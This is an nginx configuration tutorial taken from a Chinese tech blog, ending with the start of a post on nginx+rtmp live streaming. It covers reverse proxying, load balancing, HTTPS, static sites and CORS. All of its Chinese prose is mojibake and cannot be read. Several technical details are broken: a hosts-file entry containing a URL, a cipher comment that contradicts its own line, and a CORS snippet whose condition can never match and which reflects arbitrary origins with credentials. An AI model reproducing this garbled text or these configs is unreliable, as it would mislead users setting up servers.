å¦‚æœä¸æƒ³æ¯æ¬¡éƒ½æ•²å‘½ä»¤ï¼Œå¯ä»¥åœ¨nginxå®‰è£…ç›®å½•ä¸‹æ–°æ·»ä¸€ä¸ªå¯åŠ¨æ‰¹å¤„ç†æ–‡ä»¶startup.batï¼ŒåŒå‡»å³å¯è¿è¡Œã€‚å†…å®¹å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12  @echo off rem å¦‚æœå¯åŠ¨å‰å·²ç»å¯åŠ¨nginxå¹¶è®°å½•ä¸‹pidæ–‡ä»¶ï¼Œä¼škillæŒ‡å®šè¿›ç¨‹ nginx.exe -s stop rem æµ‹è¯•é…ç½®æ–‡ä»¶è¯­æ³•æ­£ç¡®æ€§ nginx.exe -t -c conf/nginx.conf rem æ˜¾ç¤ºç‰ˆæœ¬ä¿¡æ¯ nginx.exe -v rem æŒ‰ç…§æŒ‡å®šé…ç½®å»å¯åŠ¨nginx nginx.exe -c conf/nginx.conf   å¦‚æœæ˜¯è¿è¡Œåœ¨ Linux ä¸‹ï¼Œå†™ä¸€ä¸ª shell è„šæœ¬ï¼Œå¤§åŒå°å¼‚ã€‚\né…ç½® nginx é…ç½®å®æˆ˜ æˆ‘å§‹ç»ˆè®¤ä¸ºï¼Œå„ç§å¼€å‘å·¥å…·çš„é…ç½®è¿˜æ˜¯ç»“åˆå®æˆ˜æ¥è®²è¿°ï¼Œä¼šè®©äººæ›´æ˜“ç†è§£ã€‚\nhttpåå‘ä»£ç†é…ç½® æˆ‘ä»¬å…ˆå®ç°ä¸€ä¸ªå°ç›®æ ‡ï¼šä¸è€ƒè™‘å¤æ‚çš„é…ç½®ï¼Œä»…ä»…æ˜¯å®Œæˆä¸€ä¸ª http åå‘ä»£ç†ã€‚\nnginx.conf é…ç½®æ–‡ä»¶å¦‚ä¸‹ï¼š æ³¨ï¼šconf / nginx.conf æ˜¯ nginx çš„é»˜è®¤é…ç½®æ–‡ä»¶ã€‚ä½ ä¹Ÿå¯ä»¥ä½¿ç”¨ nginx -c æŒ‡å®šä½ çš„é…ç½®æ–‡ä»¶\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107  #è¿è¡Œç”¨æˆ· #user somebody; #å¯åŠ¨è¿›ç¨‹,é€šå¸¸è®¾ç½®æˆå’Œcpuçš„æ•°é‡ç›¸ç­‰ worker_processes 1; #å…¨å±€é”™è¯¯æ—¥å¿— error_log D:/Tools/nginx-1.10.1/logs/error.log; error_log D:/Tools/nginx-1.10.1/logs/notice.log notice; error_log D:/Tools/nginx-1.10.1/logs/info.log info; #PIDæ–‡ä»¶ï¼Œè®°å½•å½“å‰å¯åŠ¨çš„nginxçš„è¿›ç¨‹ID pid D:/Tools/nginx-1.10.1/logs/nginx.pid; #å·¥ä½œæ¨¡å¼åŠè¿æ¥æ•°ä¸Šé™ events { worker_connections 1024; #å•ä¸ªåå°worker processè¿›ç¨‹çš„æœ€å¤§å¹¶å‘é“¾æ¥æ•° } #è®¾å®šhttpæœåŠ¡å™¨ï¼Œåˆ©ç”¨å®ƒçš„åå‘ä»£ç†åŠŸèƒ½æä¾›è´Ÿè½½å‡è¡¡æ”¯æŒ http { #è®¾å®šmimeç±»å‹(é‚®ä»¶æ”¯æŒç±»å‹),ç±»å‹ç”±mime.typesæ–‡ä»¶å®šä¹‰ include D:/Tools/nginx-1.10.1/conf/mime.types; default_type application/octet-stream; #è®¾å®šæ—¥å¿— log_format main '[$remote_addr] - [$remote_user] [$time_local] \"$request\" ' '$status $body_bytes_sent \"$http_referer\" ' '\"$http_user_agent\" \"$http_x_forwarded_for\"'; access_log D:/Tools/nginx-1.10.1/logs/access.log main; rewrite_log on; #sendfile æŒ‡ä»¤æŒ‡å®š nginx æ˜¯å¦è°ƒç”¨ sendfile å‡½æ•°ï¼ˆzero copy æ–¹å¼ï¼‰æ¥è¾“å‡ºæ–‡ä»¶ï¼Œå¯¹äºæ™®é€šåº”ç”¨ï¼Œ #å¿…é¡»è®¾ä¸º on,å¦‚æœç”¨æ¥è¿›è¡Œä¸‹è½½ç­‰åº”ç”¨ç£ç›˜IOé‡è´Ÿè½½åº”ç”¨ï¼Œå¯è®¾ç½®ä¸º offï¼Œä»¥å¹³è¡¡ç£ç›˜ä¸ç½‘ç»œI/Oå¤„ç†é€Ÿåº¦ï¼Œé™ä½ç³»ç»Ÿçš„uptime. sendfile on; #tcp_nopush on; #è¿æ¥è¶…æ—¶æ—¶é—´ keepalive_timeout 120; tcp_nodelay on; #gzipå‹ç¼©å¼€å…³ #gzip on; #è®¾å®šå®é™…çš„æœåŠ¡å™¨åˆ—è¡¨ upstream zp_server1{ server 127.0.0.1:8089; } #HTTPæœåŠ¡å™¨ server { #ç›‘å¬80ç«¯å£ï¼Œ80ç«¯å£æ˜¯çŸ¥åç«¯å£å·ï¼Œç”¨äºHTTPåè®® listen 80; #å®šä¹‰ä½¿ç”¨www.xx.comè®¿é—® server_name www.helloworld.com; #é¦–é¡µ index index.html #æŒ‡å‘webappçš„ç›®å½• root D:_WorkspaceProjectgithubzpSpringNotesspring-securityspring-shirosrcmainwebapp; #ç¼–ç æ ¼å¼ charset utf-8; #ä»£ç†é…ç½®å‚æ•° proxy_connect_timeout 180; proxy_send_timeout 180; proxy_read_timeout 180; proxy_set_header Host $host; proxy_set_header X-Forwarder-For $remote_addr; #åå‘ä»£ç†çš„è·¯å¾„ï¼ˆå’Œupstreamç»‘å®šï¼‰ï¼Œlocation åé¢è®¾ç½®æ˜ å°„çš„è·¯å¾„ location / { proxy_pass http://zp_server1; } #é™æ€æ–‡ä»¶ï¼Œnginxè‡ªå·±å¤„ç† location ~ ^/(images|javascript|js|css|flash|media|static)/ { root D:_WorkspaceProjectgithubzpSpringNotesspring-securityspring-shirosrcmainwebappiews; #è¿‡æœŸ30å¤©ï¼Œé™æ€æ–‡ä»¶ä¸æ€ä¹ˆæ›´æ–°ï¼Œè¿‡æœŸå¯ä»¥è®¾å¤§ä¸€ç‚¹ï¼Œå¦‚æœé¢‘ç¹æ›´æ–°ï¼Œåˆ™å¯ä»¥è®¾ç½®å¾—å°ä¸€ç‚¹ã€‚ expires 30d; } #è®¾å®šæŸ¥çœ‹NginxçŠ¶æ€çš„åœ°å€ location /NginxStatus { stub_status on; access_log on; auth_basic \"NginxStatus\"; auth_basic_user_file conf/htpasswd; } #ç¦æ­¢è®¿é—® .htxxx æ–‡ä»¶ location ~ /.ht { deny all; } #é”™è¯¯å¤„ç†é¡µé¢ï¼ˆå¯é€‰æ‹©æ€§é…ç½®ï¼‰ #error_page 404 /404.html; #error_page 500 502 503 504 /50x.html; #location = /50x.html { # root html; #} } }   å¥½äº†ï¼Œè®©æˆ‘ä»¬æ¥è¯•è¯•å§ï¼š\n å¯åŠ¨ webappï¼Œæ³¨æ„å¯åŠ¨ç»‘å®šçš„ç«¯å£è¦å’Œnginxä¸­çš„ upstream è®¾ç½®çš„ç«¯å£ä¿æŒä¸€è‡´ã€‚ æ›´æ”¹ hostï¼šåœ¨ C:WindowsSystem32driversetc ç›®å½•ä¸‹çš„hostæ–‡ä»¶ä¸­æ·»åŠ ä¸€æ¡DNS è®°å½•127.0.0.1 http://www.helloworld.com å¯åŠ¨å‰æ–‡ä¸­ startup.bat çš„å‘½ä»¤ åœ¨æµè§ˆå™¨ä¸­è®¿é—® http://www.helloworld.comï¼Œä¸å‡ºæ„å¤–ï¼Œå·²ç»å¯ä»¥è®¿é—®äº†ã€‚  è´Ÿè½½å‡è¡¡é…ç½® ä¸Šä¸€ä¸ªä¾‹å­ä¸­ï¼Œä»£ç†ä»…ä»…æŒ‡å‘ä¸€ä¸ªæœåŠ¡å™¨ã€‚\nä½†æ˜¯ï¼Œç½‘ç«™åœ¨å®é™…è¿è¥è¿‡ç¨‹ä¸­ï¼Œå¤šåŠéƒ½æ˜¯æœ‰å¤šå°æœåŠ¡å™¨è¿è¡Œç€åŒæ ·çš„appï¼Œè¿™æ—¶éœ€è¦ä½¿ç”¨è´Ÿè½½å‡è¡¡æ¥åˆ†æµã€‚\nnginxä¹Ÿå¯ä»¥å®ç°ç®€å•çš„è´Ÿè½½å‡è¡¡åŠŸèƒ½ã€‚\nå‡è®¾è¿™æ ·ä¸€ä¸ªåº”ç”¨åœºæ™¯ï¼šå°†åº”ç”¨éƒ¨ç½²åœ¨ 192.168.1.11:80ã€192.168.1.12:80ã€192.168.1.13:80 ä¸‰å°linuxç¯å¢ƒçš„æœåŠ¡å™¨ä¸Šã€‚ç½‘ç«™åŸŸåå« http://www.helloworld.comï¼Œå…¬ç½‘IPä¸º 192.168.1.11ã€‚åœ¨å…¬ç½‘IPæ‰€åœ¨çš„æœåŠ¡å™¨ä¸Šéƒ¨ç½² nginxï¼Œå¯¹æ‰€æœ‰è¯·æ±‚åšè´Ÿè½½å‡è¡¡å¤„ç†ã€‚\nnginx.conf é…ç½®å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48  http { #è®¾å®šmimeç±»å‹,ç±»å‹ç”±mime.typeæ–‡ä»¶å®šä¹‰ include /etc/nginx/mime.types; default_type application/octet-stream; #è®¾å®šæ—¥å¿—æ ¼å¼ access_log /var/log/nginx/access.log; #è®¾å®šè´Ÿè½½å‡è¡¡çš„æœåŠ¡å™¨åˆ—è¡¨ upstream load_balance_server { #weigthå‚æ•°è¡¨ç¤ºæƒå€¼ï¼Œæƒå€¼è¶Šé«˜è¢«åˆ†é…åˆ°çš„å‡ ç‡è¶Šå¤§ server 192.168.1.11:80 weight=5; server 192.168.1.12:80 weight=1; server 192.168.1.13:80 weight=6; } #HTTPæœåŠ¡å™¨ server { #ä¾¦å¬80ç«¯å£ listen 80; #å®šä¹‰ä½¿ç”¨www.xx.comè®¿é—® server_name www.helloworld.com; #å¯¹æ‰€æœ‰è¯·æ±‚è¿›è¡Œè´Ÿè½½å‡è¡¡è¯·æ±‚ location / { root /root; #å®šä¹‰æœåŠ¡å™¨çš„é»˜è®¤ç½‘ç«™æ ¹ç›®å½•ä½ç½® index index.html index.htm; #å®šä¹‰é¦–é¡µç´¢å¼•æ–‡ä»¶çš„åç§° proxy_pass http://load_balance_server ;#è¯·æ±‚è½¬å‘load_balance_server å®šä¹‰çš„æœåŠ¡å™¨åˆ—è¡¨ #ä»¥ä¸‹æ˜¯ä¸€äº›åå‘ä»£ç†çš„é…ç½®(å¯é€‰æ‹©æ€§é…ç½®) #proxy_redirect off; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; #åç«¯çš„WebæœåŠ¡å™¨å¯ä»¥é€šè¿‡X-Forwarded-Forè·å–ç”¨æˆ·çœŸå®IP proxy_set_header X-Forwarded-For $remote_addr; proxy_connect_timeout 90; #nginxè·Ÿåç«¯æœåŠ¡å™¨è¿æ¥è¶…æ—¶æ—¶é—´(ä»£ç†è¿æ¥è¶…æ—¶) proxy_send_timeout 90; #åç«¯æœåŠ¡å™¨æ•°æ®å›ä¼ æ—¶é—´(ä»£ç†å‘é€è¶…æ—¶) proxy_read_timeout 90; #è¿æ¥æˆåŠŸåï¼Œåç«¯æœåŠ¡å™¨å“åº”æ—¶é—´(ä»£ç†æ¥æ”¶è¶…æ—¶) proxy_buffer_size 4k; #è®¾ç½®ä»£ç†æœåŠ¡å™¨ï¼ˆnginxï¼‰ä¿å­˜ç”¨æˆ·å¤´ä¿¡æ¯çš„ç¼“å†²åŒºå¤§å° proxy_buffers 4 32k; #proxy_buffersç¼“å†²åŒºï¼Œç½‘é¡µå¹³å‡åœ¨32kä»¥ä¸‹çš„è¯ï¼Œè¿™æ ·è®¾ç½® proxy_busy_buffers_size 64k; #é«˜è´Ÿè·ä¸‹ç¼“å†²å¤§å°ï¼ˆproxy_buffers*2ï¼‰ proxy_temp_file_write_size 64k; #è®¾å®šç¼“å­˜æ–‡ä»¶å¤¹å¤§å°ï¼Œå¤§äºè¿™ä¸ªå€¼ï¼Œå°†ä»upstreamæœåŠ¡å™¨ä¼  client_max_body_size 10m; #å…è®¸å®¢æˆ·ç«¯è¯·æ±‚çš„æœ€å¤§å•æ–‡ä»¶å­—èŠ‚æ•° client_body_buffer_size 128k; #ç¼“å†²åŒºä»£ç†ç¼“å†²ç”¨æˆ·ç«¯è¯·æ±‚çš„æœ€å¤§å­—èŠ‚æ•° } } }   ç½‘ç«™æœ‰å¤šä¸ªwebappçš„é…ç½® å½“ä¸€ä¸ªç½‘ç«™åŠŸèƒ½è¶Šæ¥è¶Šä¸°å¯Œæ—¶ï¼Œå¾€å¾€éœ€è¦å°†ä¸€äº›åŠŸèƒ½ç›¸å¯¹ç‹¬ç«‹çš„æ¨¡å—å‰¥ç¦»å‡ºæ¥ï¼Œç‹¬ç«‹ç»´æŠ¤ã€‚è¿™æ ·çš„è¯ï¼Œé€šå¸¸ï¼Œä¼šæœ‰å¤šä¸ª webappã€‚\nä¸¾ä¸ªä¾‹å­ï¼šå‡å¦‚ http://www.helloworld.com ç«™ç‚¹æœ‰å¥½å‡ ä¸ªwebappï¼Œfinanceï¼ˆé‡‘èï¼‰ã€productï¼ˆäº§å“ï¼‰ã€adminï¼ˆç”¨æˆ·ä¸­å¿ƒï¼‰ã€‚è®¿é—®è¿™äº›åº”ç”¨çš„æ–¹å¼é€šè¿‡ä¸Šä¸‹æ–‡(context)æ¥è¿›è¡ŒåŒºåˆ†:\n http://www.helloworld.com/finance/ http://www.helloworld.com/product/ http://www.helloworld.com/admin/  æˆ‘ä»¬çŸ¥é“ï¼Œhttpçš„é»˜è®¤ç«¯å£å·æ˜¯80ï¼Œå¦‚æœåœ¨ä¸€å°æœåŠ¡å™¨ä¸ŠåŒæ—¶å¯åŠ¨è¿™3ä¸ª webapp åº”ç”¨ï¼Œéƒ½ç”¨80ç«¯å£ï¼Œè‚¯å®šæ˜¯ä¸æˆçš„ã€‚æ‰€ä»¥ï¼Œè¿™ä¸‰ä¸ªåº”ç”¨éœ€è¦åˆ†åˆ«ç»‘å®šä¸åŒçš„ç«¯å£å·ã€‚\né‚£ä¹ˆï¼Œé—®é¢˜æ¥äº†ï¼Œç”¨æˆ·åœ¨å®é™…è®¿é—® http://www.helloworld.com ç«™ç‚¹æ—¶ï¼Œè®¿é—®ä¸åŒ webappï¼Œæ€»ä¸ä¼šè¿˜å¸¦ç€å¯¹åº”çš„ç«¯å£å·å»è®¿é—®å§ã€‚æ‰€ä»¥ï¼Œä½ å†æ¬¡éœ€è¦ç”¨åˆ°åå‘ä»£ç†æ¥åšå¤„ç†ã€‚\né…ç½®ä¹Ÿä¸éš¾ï¼Œæ¥çœ‹çœ‹æ€ä¹ˆåšå§ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35  http { #æ­¤å¤„çœç•¥ä¸€äº›åŸºæœ¬é…ç½® upstream product_server{ server www.helloworld.com:8081; } upstream admin_server{ server www.helloworld.com:8082; } upstream finance_server{ server www.helloworld.com:8083; } server { #æ­¤å¤„çœç•¥ä¸€äº›åŸºæœ¬é…ç½® #é»˜è®¤æŒ‡å‘productçš„server location / { proxy_pass http://product_server; } location /product/{ proxy_pass http://product_server; } location /admin/ { proxy_pass http://admin_server; } location /finance/ { proxy_pass http://finance_server; } } }   httpsåå‘ä»£ç†é…ç½® ä¸€äº›å¯¹å®‰å…¨æ€§è¦æ±‚æ¯”è¾ƒé«˜çš„ç«™ç‚¹ï¼Œå¯èƒ½ä¼šä½¿ç”¨ HTTPSï¼ˆä¸€ç§ä½¿ç”¨sslé€šä¿¡æ ‡å‡†çš„å®‰å…¨HTTPåè®®ï¼‰ã€‚\nè¿™é‡Œä¸ç§‘æ™® HTTP åè®®å’Œ SSL æ ‡å‡†ã€‚ä½†æ˜¯ï¼Œä½¿ç”¨ nginx é…ç½® https éœ€è¦çŸ¥é“å‡ ç‚¹ï¼š\n HTTPS çš„å›ºå®šç«¯å£å·æ˜¯ 443ï¼Œä¸åŒäº HTTP çš„ 80 ç«¯å£ SSL æ ‡å‡†éœ€è¦å¼•å…¥å®‰å…¨è¯ä¹¦ï¼Œæ‰€ä»¥åœ¨ nginx.conf ä¸­ä½ éœ€è¦æŒ‡å®šè¯ä¹¦å’Œå®ƒå¯¹åº”çš„ key  å…¶ä»–å’Œ http åå‘ä»£ç†åŸºæœ¬ä¸€æ ·ï¼Œåªæ˜¯åœ¨ Server éƒ¨åˆ†é…ç½®æœ‰äº›ä¸åŒã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  #HTTPæœåŠ¡å™¨ server { #ç›‘å¬443ç«¯å£ã€‚443ä¸ºçŸ¥åç«¯å£å·ï¼Œä¸»è¦ç”¨äºHTTPSåè®® listen 443 ssl; #å®šä¹‰ä½¿ç”¨www.xx.comè®¿é—® server_name www.helloworld.com; #sslè¯ä¹¦æ–‡ä»¶ä½ç½®(å¸¸è§è¯ä¹¦æ–‡ä»¶æ ¼å¼ä¸ºï¼šcrt/pem) ssl_certificate cert.pem; #sslè¯ä¹¦keyä½ç½® ssl_certificate_key cert.key; #sslé…ç½®å‚æ•°ï¼ˆé€‰æ‹©æ€§é…ç½®ï¼‰ ssl_session_cache shared:SSL:1m; ssl_session_timeout 5m; #æ•°å­—ç­¾åï¼Œæ­¤å¤„ä½¿ç”¨MD5 ssl_ciphers HIGH:!aNULL:!MD5; ssl_prefer_server_ciphers on; location / { root /root; index index.html index.htm; } }   ç»™å‡ºä¸€ä¸ªåå‘ä»£ç†çš„ç®€å•ä¾‹å­\nå‚è€ƒï¼šhttps://www.jianshu.com/p/bcfb5a3a5903\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  # æ·»åŠ ä¸Šé¢çš„https server { listen 443 ssl; ssl_certificate server.crt; ssl_certificate_key server_nopwd.key; } server { listen 8080; # è®¿é—®8080ç«¯å£ï¼Œè·³è½¬åˆ°ç½‘æ˜“é¦–é¡µ  location / { proxy_pass https://163.com; proxy_redirect off; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; } # è®¿é—® 8080:/readme.md ä»githubä¸Šè·å–ç›¸åº”çš„æ–‡ä»¶  location /readme.md { proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_pass https://github.com/yidao620c/scrapy-cookbook/blob/master/README.md; } }   é™æ€ç«™ç‚¹é…ç½® æœ‰æ—¶å€™ï¼Œæˆ‘ä»¬éœ€è¦é…ç½®é™æ€ç«™ç‚¹(å³ html æ–‡ä»¶å’Œä¸€å †é™æ€èµ„æº)ã€‚\nä¸¾ä¾‹æ¥è¯´ï¼šå¦‚æœæ‰€æœ‰çš„é™æ€èµ„æºéƒ½æ”¾åœ¨äº† /app/dist ç›®å½•ä¸‹ï¼Œæˆ‘ä»¬åªéœ€è¦åœ¨ nginx.conf ä¸­æŒ‡å®šé¦–é¡µä»¥åŠè¿™ä¸ªç«™ç‚¹çš„ host å³å¯ã€‚\né…ç½®å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27  worker_processes 1; events { worker_connections 1024; } http { include mime.types; default_type application/octet-stream; sendfile on; keepalive_timeout 65; gzip on; gzip_types text/plain application/x-javascript text/css application/xml text/javascript application/javascript image/jpeg image/gif image/png; gzip_vary on; server { listen 80; server_name static.zp.cn; location / { root /app/dist; index index.html; #è½¬å‘ä»»ä½•è¯·æ±‚åˆ° index.html } } }   ç„¶åï¼Œæ·»åŠ  HOSTï¼š127.0.0.1 http://static.zp.cnï¼Œæ­¤æ—¶ï¼Œåœ¨æœ¬åœ°æµè§ˆå™¨è®¿é—® http://static.zp.cn ï¼Œå°±å¯ä»¥è®¿é—®é™æ€ç«™ç‚¹äº†ã€‚\nè·¨åŸŸè§£å†³æ–¹æ¡ˆ web é¢†åŸŸå¼€å‘ä¸­ï¼Œç»å¸¸é‡‡ç”¨å‰åç«¯åˆ†ç¦»æ¨¡å¼ã€‚è¿™ç§æ¨¡å¼ä¸‹ï¼Œå‰ç«¯å’Œåç«¯åˆ†åˆ«æ˜¯ç‹¬ç«‹çš„ web åº”ç”¨ç¨‹åºï¼Œä¾‹å¦‚ï¼šåç«¯æ˜¯ Java ç¨‹åºï¼Œå‰ç«¯æ˜¯ React æˆ– Vue åº”ç”¨ã€‚\nå„è‡ªç‹¬ç«‹çš„ web app åœ¨äº’ç›¸è®¿é—®æ—¶ï¼ŒåŠ¿å¿…å­˜åœ¨è·¨åŸŸé—®é¢˜ã€‚è§£å†³è·¨åŸŸé—®é¢˜ä¸€èˆ¬æœ‰ä¸¤ç§æ€è·¯ï¼š\nCORS åœ¨åç«¯æœåŠ¡å™¨è®¾ç½® HTTP å“åº”å¤´ï¼ŒæŠŠä½ éœ€è¦è¿è¡Œè®¿é—®çš„åŸŸååŠ å…¥åŠ å…¥ Access-Control-Allow-Origin ä¸­ã€‚\njsonp æŠŠåç«¯æ ¹æ®è¯·æ±‚ï¼Œæ„é€ jsonæ•°æ®ï¼Œå¹¶è¿”å›ï¼Œå‰ç«¯ç”¨ jsonp è·¨åŸŸã€‚\nè¿™ä¸¤ç§æ€è·¯ï¼Œæœ¬æ–‡ä¸å±•å¼€è®¨è®ºã€‚\néœ€è¦è¯´æ˜çš„æ˜¯ï¼Œnginx æ ¹æ®ç¬¬ä¸€ç§æ€è·¯ï¼Œä¹Ÿæä¾›äº†ä¸€ç§è§£å†³è·¨åŸŸçš„è§£å†³æ–¹æ¡ˆã€‚\nä¸¾ä¾‹ï¼šhttp://www.helloworld.com ç½‘ç«™æ˜¯ç”±ä¸€ä¸ªå‰ç«¯ app ï¼Œä¸€ä¸ªåç«¯ app ç»„æˆçš„ã€‚å‰ç«¯ç«¯å£å·ä¸º 9000ï¼Œ åç«¯ç«¯å£å·ä¸º 8080ã€‚\nå‰ç«¯å’Œåç«¯å¦‚æœä½¿ç”¨ http è¿›è¡Œäº¤äº’æ—¶ï¼Œè¯·æ±‚ä¼šè¢«æ‹’ç»ï¼Œå› ä¸ºå­˜åœ¨è·¨åŸŸé—®é¢˜ã€‚æ¥çœ‹çœ‹ï¼Œnginx æ˜¯æ€ä¹ˆè§£å†³çš„å§ï¼š\né¦–å…ˆï¼Œåœ¨ enable-cors.conf æ–‡ä»¶ä¸­è®¾ç½® cors ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  # allow origin list set $ACAO '*'; # set single origin if ($http_origin ~* (www.helloworld.com)$) { set $ACAO $http_origin; } if ($cors = \"trueget\") { add_header 'Access-Control-Allow-Origin' \"$http_origin\"; add_header 'Access-Control-Allow-Credentials' 'true'; add_header 'Access-Control-Allow-Methods' 'GET, POST, OPTIONS'; add_header 'Access-Control-Allow-Headers' 'DNT,X-Mx-ReqToken,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type'; } if ($request_method = 'OPTIONS') { set $cors \"${cors}options\"; } if ($request_method = 'GET') { set $cors \"${cors}get\"; } if ($request_method = 'POST') { set $cors \"${cors}post\"; }   æ¥ä¸‹æ¥ï¼Œåœ¨ä½ çš„æœåŠ¡å™¨ä¸­ include enable-cors.conf æ¥å¼•å…¥è·¨åŸŸé…ç½®ï¼š\n# ---------------------------------------------------- # æ­¤æ–‡ä»¶ä¸ºé¡¹ç›® nginx é…ç½®ç‰‡æ®µ # å¯ä»¥ç›´æ¥åœ¨ nginx config ä¸­ includeï¼ˆæ¨èï¼‰ # æˆ–è€… copy åˆ°ç°æœ‰ nginx ä¸­ï¼Œè‡ªè¡Œé…ç½® # www.helloworld.com åŸŸåéœ€é…åˆ dns hosts è¿›è¡Œé…ç½® # å…¶ä¸­ï¼Œapi å¼€å¯äº† corsï¼Œéœ€é…åˆæœ¬ç›®å½•ä¸‹å¦ä¸€ä»½é…ç½®æ–‡ä»¶ # ---------------------------------------------------- upstream front_server{ server www.helloworld.com:9000; } upstream api_server{ server www.helloworld.com:8080; } server { listen 80; server_name www.helloworld.com; location ~ ^/api/ { include enable-cors.conf; proxy_pass http://api_server; rewrite \"^/api/(.*)$\" /$1 break; } location ~ ^/ { proxy_pass http://front_server; } } ","description":"","tags":["nginx"],"title":"Nginx","uri":"/posts/nginx/"},{"categories":["nginx"],"content":"nginx+rtmp æ­å»ºè§†é¢‘ç›´æ’­æœåŠ¡å™¨ æœåŠ¡å™¨å®‰è£…é…ç½®  windowså®‰è£…åŒ…(å·²ç¼–è¯‘å¥½çš„ç‰ˆæœ¬)å‚è€ƒï¼š\nnginx for windows\nwindowsä¸‹æ­å»ºåŸºäºnginxçš„rtmpæœåŠ¡å™¨\nåœ¨Windowsä¸‹æ­å»ºåŸºäºnginxçš„è§†é¢‘ç›´æ’­å’Œç‚¹æ’­ç³»ç»Ÿ\n  æ¬è¿æºç ï¼ˆæœªç¼–è¯‘ï¼‰\nCar-eye-RTMP-server(github)\ncar-eye-http-flv-module\n  nginx+rtmpåœ¨windowsä¸‹ç¼–è¯‘\nWindowsä¸‹ç¼–è¯‘nginx-rtmp-module\nwindowsä¸‹ç¼–è¯‘nginx+nginx_rtmp_modue(vs2013)\n  CentOSæ­å»ºnginx+rtmpæœåŠ¡å™¨\nnginx+rtmpç›´æ’­æµæœåŠ¡æ­å»º centos7\ncentos7 Nginx+rtmp æ­å»ºæµåª’ä½“æœåŠ¡å™¨\n linuxä¸‹å»ºè®®å°†nginx.confä¸­çš„httpç«¯å£æ”¹ä¸º1024ä»¥ä¸Šï¼Œå¥½åƒæ˜¯80ç«¯å£æ¯æ¬¡è¿è¡Œéƒ½éœ€è¦suæƒé™ã€‚\nNginxæ­å»ºrtmpæµåª’ä½“æœåŠ¡å™¨\nnginxæœåŠ¡å™¨å¸¸ç”¨å‘½ä»¤ 1 2 3 4 5 6 7 8 9 10 11  ./nginx -v//æŸ¥çœ‹nginxç‰ˆæœ¬å· ./nginx -V //æŸ¥çœ‹nginxè¯¦ç»†çš„ç‰ˆæœ¬ä¿¡æ¯ start ./nginx -c conf/nginx.conf //ä»¥nginx.confçš„é…ç½®å¯åŠ¨nginx ./nginx -s stop//åœæ­¢nginxæœåŠ¡å™¨ ./nginx -s quit//åœæ­¢nginxæœåŠ¡å™¨ ./nginx -s reload//é‡å¯nginxæœåŠ¡å™¨ service nginx reload//é‡å¯nginxæœåŠ¡å™¨ ./nginx -t (-c conf/nginx.conf)//æ£€æŸ¥é…ç½®æ–‡ä»¶æ˜¯å¦æ­£ç¡® ./nginx -h//æ˜¾ç¤ºå¸®åŠ©ä¿¡æ¯ ./nginx -?//æ˜¾ç¤ºå¸®åŠ©ä¿¡æ¯   nginx+rtmpåŠ å…¥æƒé™æ§åˆ¶  æœ¬æ–‡å‚è€ƒï¼š\n*rtmp-moduleå®˜æ–¹wiki\n*è§†é¢‘ç›´æ’­ç‚¹æ’­nginx-rtmpå¼€å‘æ‰‹å†Œä¸­æ–‡ç‰ˆ(å‚è€ƒwikiç‰ˆæœ¬ç²—è¯‘)\nå¦‚ä½•ç»™ nginx rtmp æœåŠ¡åŠ å…¥é‰´æƒæœºåˆ¶(æ”¹æºç )\n*ã€Œè‡ªå·±å¼€å‘ç›´æ’­ã€å®ç°nginx-rtmp-moduleå¤šé¢‘é“è¾“å…¥è¾“å‡ºä¸æƒé™æ§åˆ¶\nnginx-rtmp-moduleæˆæƒæœºåˆ¶å®ç°ç›´æ’­æ¨æµå¤šæˆ¿é—´æˆæƒè®¤è¯\nnginx-rtmp-module æƒé™æ§åˆ¶\nnginx-rtmpåŠ å…¥æƒé™éªŒè¯çš„ç®€å•æ–¹æ³•\nè§†é¢‘ç›´æ’­ç‚¹æ’­nginx-rtmpå¼€å‘æ‰‹å†Œä¸­æ–‡ç‰ˆ\n*nginx.confä¸­å…³äºnginx-rtmp-moduleé…ç½®æŒ‡ä»¤è¯¦è§£\n*nginx-rtmpå¤šæˆ¿é—´å’Œæˆæƒå®ç°\n *åšå®¢æ¯”è¾ƒæœ‰ç”¨\n  nginxçš„rtmp-moduleé»˜è®¤ä¸é™åˆ¶æ¨æµæƒé™ã€æ’­æ”¾æƒé™ã€‚\næƒ³åŠ å…¥æƒé™éªŒè¯æœ‰å¾ˆå¤šç§æ–¹æ³•ã€‚\nå…¶ä¸­ä¸€ä¸ªæ˜¯æ”¹æºç ï¼Œä¸€ä¸ªæ˜¯åˆ©ç”¨nginx+rtmpçš„é…ç½®æ–‡ä»¶è°ƒç”¨åå°æ¥å£è¿›è¡ŒéªŒè¯ã€‚\nç¬¬ä¸€ç§æ–¹æ³•æ²¡æˆåŠŸè¿‡ï¼Œç¬¬äºŒç§æ–¹æ³•æ¯”è¾ƒç®€å•ã€‚æ­¤æ–‡ä»‹ç»ç¬¬äºŒç§æ–¹æ³•ï¼Œç¬¬ä¸€ç§æ–¹æ³•å¯è§åšå®¢-\u003eå¦‚ä½•ç»™ nginx rtmp æœåŠ¡åŠ å…¥é‰´æƒæœºåˆ¶(æ”¹æºç 